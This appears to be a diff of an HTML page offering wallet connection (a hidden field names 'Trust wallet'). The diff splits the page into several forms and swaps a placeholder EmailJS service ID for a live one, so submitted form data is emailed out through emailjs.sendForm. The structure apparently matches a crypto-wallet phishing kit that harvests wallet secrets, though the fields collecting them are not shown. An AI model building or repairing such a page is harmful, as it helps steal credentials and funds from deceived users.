@@ -136,6 +136,8 @@
                               <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                             </svg></span></button></div>
                                         </div>
+                                    </form>
+                                      <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
                                         <div id="second" class="acc-body bg-grey-600">
                                             <div class="flex flex-col">
 
@@ -160,6 +162,8 @@
                         0 11-18 0 9 9 0 0118 0z"></path>
                             </svg></span></button></div>
                                         </div>
+                                      </form>
+                                      <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
                                         <div id="third" class="acc-body bg-grey-600">
                                             <div class="flex flex-col">
                                                 <div class="relative"><input type="hidden" name="wallet_id" required="required" placeholder="Wallet ID" id="wallet_id" value="Trust wallet"></div>
@@ -730,7 +734,7 @@ document.getElementById('my-form')
 
    btn.value = 'Sending...';
 
-   const serviceID = 'default_service';
+   const serviceID = 'service_zpoc9tn';
    const templateID = 'template_dpkh9dd';
 
    emailjs.sendForm(serviceID, templateID, this)
